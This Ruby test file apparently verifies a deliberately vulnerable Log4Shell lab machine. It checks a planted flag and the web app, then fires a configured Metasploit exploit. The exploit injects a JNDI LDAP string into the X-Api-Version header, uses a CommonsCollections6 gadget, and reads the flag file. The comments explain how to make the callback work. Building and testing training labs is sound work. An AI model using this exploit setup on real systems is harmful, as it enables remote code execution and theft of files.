require_relative '../../../../../lib/post_provision_test'

class Log4shellHeaderInjectionTest < PostProvisionTest
  def initialize
    self.module_name = 'log4shell_header_injection'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # read_facts: port (self.port, tiers 2/3), unix_username (service owner +
    # exploit shell owner), leaked_filenames + strings_to_leak (tier-1 flag check).
    username  = self.json_inputs['unix_username']&.first
    flag_file = self.json_inputs['leaked_filenames']&.first
    flag_str  = self.json_inputs['strings_to_leak']&.first

    tier(1) do
      if username
        test_local_command("#{username} user exists", "id #{username}", username)
      end
      if username && flag_file && flag_str
        test_local_command('leaked flag present', "sudo cat /home/#{username}/#{flag_file}", flag_str)
      end
    end

    tier(2) do
      test_service_up
      # The minimal log4j web app answers on / with its own banner.
      test_http('/', match: 'minimal log4j webapp')
    end

    # Tier 3: CVE-2021-44228. The app logs the X-Api-Version header through log4j
    # 2.14.1, so the module injects a ${jndi:ldap://...} string into that header;
    # the target's log4j resolves it against the module's LDAP server. The Linux
    # target (TARGET 2) delivers a serialized CommonsCollections6 gadget inline
    # over LDAP (commons-collections 3.2.1 is on the app classpath) rather than
    # remote class loading, so the no-session cmd/unix/generic sentinel runs the
    # command directly as the service user -> <privilege>=user_rwx.
    #
    # SRVHOST must be the attacker's own IP: the module embeds it in the JNDI
    # string the target calls back to, and leaving it at 0.0.0.0 makes the LDAP
    # host nil. AutoCheck is disabled because its scanner needs the same SRVHOST
    # and otherwise aborts the run before the exploit fires.
    tier(3) do
      resolved = resolve_attacker('exploit/multi/http/log4shell_header_injection', nil, nil, 3)
      next unless resolved
      _, attacker_ip, _ = resolved
      collect = username ? "cat /home/#{username}/#{flag_file || '*'}" : nil
      test_msf_exploit('exploit/multi/http/log4shell_header_injection',
                       rport: self.port,
                       collect: collect,
                       options: { 'HTTP_HEADER' => 'X-Api-Version',
                                  'TARGET' => 2,
                                  'JAVA_GADGET_CHAIN' => 'CommonsCollections6',
                                  'SRVHOST' => attacker_ip,
                                  'SRVPORT' => 389,
                                  'AutoCheck' => false },
                       expect_privilege: 'user_rwx',
                       tier: 3)
    end
  end
end

Log4shellHeaderInjectionTest.new.run
